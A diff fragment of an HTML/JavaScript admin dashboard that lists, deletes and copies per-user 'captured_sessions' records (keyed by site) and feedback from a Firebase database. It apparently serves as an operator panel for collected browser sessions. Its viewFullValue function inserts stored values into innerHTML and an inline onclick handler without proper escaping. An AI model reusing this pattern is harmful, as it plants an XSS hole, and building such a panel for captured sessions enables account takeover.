+            if (confirm('Delete this session?')) {
+                const path = siteKey ? `users/${userId}/captured_sessions/${siteKey}/${sessionId}` : `users/${userId}/captured_sessions/${sessionId}`;
+                db.ref(path).remove()
+                    .then(() => {
+                        showNotification('Deleted', 'Session removed', 'success');
+                        loadSessions();
+                    })
+                    .catch((error) => {
+                        showNotification('Error', error.message, 'error');
+                    });
+            }
+        }
+
+        // Delete feedback
+        function deleteFeedback(userId, feedbackId) {
+            if (confirm('Delete this feedback?')) {
+                db.ref(`users/${userId}/feedback/${feedbackId}`).remove()
+                    .then(() => {
+                        showNotification('Deleted', 'Feedback removed', 'success');
+                        loadFeedback();
+                    })
+                    .catch((error) => {
+                        showNotification('Error', error.message, 'error');
+                    });
+            }
+        }
+
+        // Copy to clipboard
+        function copyToClipboard(text) {
+            navigator.clipboard.writeText(text).then(() => {
+                showNotification('Copied!', 'Text copied to clipboard', 'success');
+            }).catch(() => {
+                const textArea = document.createElement('textarea');
+                textArea.value = text;
+                document.body.appendChild(textArea);
+                textArea.select();
+                document.execCommand('copy');
+                document.body.removeChild(textArea);
+                showNotification('Copied!', 'Text copied to clipboard', 'success');
+            });
+        }
+
+
+        // View full value
+        function viewFullValue(label, value) {
+            document.getElementById('modal-title').textContent = label;
+            document.getElementById('modal-body').innerHTML = `
+                <div class="modal-field">
+                    <div class="modal-value" style="white-space: pre-wrap;">${value}</div>
+                </div>
+                <div class="modal-field">
+                    <button onclick="copyToClipboard('${value.replace(/'/g, "\\'")}')" style="padding:8px 16px; background:var(--primary-color); color:white; border:none; border-radius:6px; cursor:pointer; width:100%;">
+                        <i class="far fa-copy"></i> Copy to Clipboard
+                    </button>
+                </div>
+            `;
+            modalOverlay.classList.add('active');
+        }
+
+        // Close modal
+        function closeModal() {
+            modalOverlay.classList.remove('active');
+        }
+
+        // Show notification
+        function showNotification(title, message, type = 'info') {
+            document.getElementById('notification-title').textContent = title;
+            document.getElementById('notification-message').textContent = message;
+
+            notification.className = `notification ${type}`;
+            const icon = notification.querySelector('.notification-icon i');
+            icon.className = type === 'success' ? 'fas fa-check-circle' :
+                type === 'error' ? 'fas fa-exclamation-circle' :
+                    type === 'warning' ? 'fas fa-exclamation-triangle' :
+                        'fas fa-info-circle';
+
+            notification.classList.add('show');
+
+            setTimeout(hideNotification, 5000);
+        }
+
+        // Hide notification
+        function hideNotification() {
+            notification.classList.remove('show');
+        }
+
+        // Update stats
+        // function updateStats() {
+        //     document.getElementById('total-users-count').textContent = allUsers.length;
+        //     document.getElementById('active-users-count').textContent = 
+        //         allUsers.filter(u => u.status?.online).length;
+        //     document.getElementById('total-data-count').textContent = 
+        //         allUsers.reduce((sum, u) => sum + (u.dataCount || 0), 0);
+        // }
+        function updateStats() {
+            const elTotal = document.getElementById('total-users-count');
+            const elActive = document.getElementById('active-users-count');
+            const elData = document.getElementById('total-data-count');
+
+            if (elTotal) elTotal.textContent = allUsers.length;
+
+            if (elActive) {
+                elActive.textContent = allUsers.filter(u => u.status?.online).length;
+            }
+
+            if (elData) {
+                elData.textContent = allUsers.reduce((sum, u) => sum + (u.dataCount || 0), 0);
+            }
+        }
+
+        // Show users list (mobile)
+        function showUsersList() {
+            selectedUser = null;
+            welcomeScreen.style.display = 'flex';
+            userDetailsHeader.style.display = 'none';
+            actionButtons.style.display = 'none';
+            tabNavigation.style.display = 'none';
+
+            if (window.innerWidth <= 768) {
+                // Show the sidebar on mobile (slide in) and ensure main content isn't blocking
+                sidebar.style.display = 'block';
+                // small delay to allow CSS transition if present
+                setTimeout(() => sidebar.classList.add('active'), 10);
+                backButton.style.display = 'none';
+                // keep main-content visible but let sidebar overlay it
+                document.getElementById('main-content').style.display = 'block';
+            }
+
+            window.history.pushState({}, '', window.location.pathname);
+        }
+
+        // Handle popstate
+        function handlePopState(event) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const userId = urlParams.get('user');
+
+            if (userId) {
+                const user = allUsers.find(u => u.id === userId);
+                if (user) selectUser(user);
+            } else {
+                showUsersList();
+            }
+        }
+
+        // Check mobile view
+        function checkMobileView() {
+            if (window.innerWidth <= 768) {
+                if (!selectedUser) {
+                    // show sidebar when no user selected
+                    sidebar.style.display = 'block';
+                    sidebar.classList.add('active');
+                    document.getElementById('main-content').style.display = 'block';
+                } else {
+                    // hide sidebar when a user is selected so main content is visible
+                    sidebar.classList.remove('active');
+                    sidebar.style.display = 'none';
+                    document.getElementById('main-content').style.display = 'block';
+                }
+            } else {
+                // Desktop: ensure sidebar visible and positioned normally
+                sidebar.style.display = 'block';
+                sidebar.classList.remove('active');
+                document.getElementById('main-content').style.display = 'block';
+            }
+        }
+    </script>
+</body>
+
+</html>
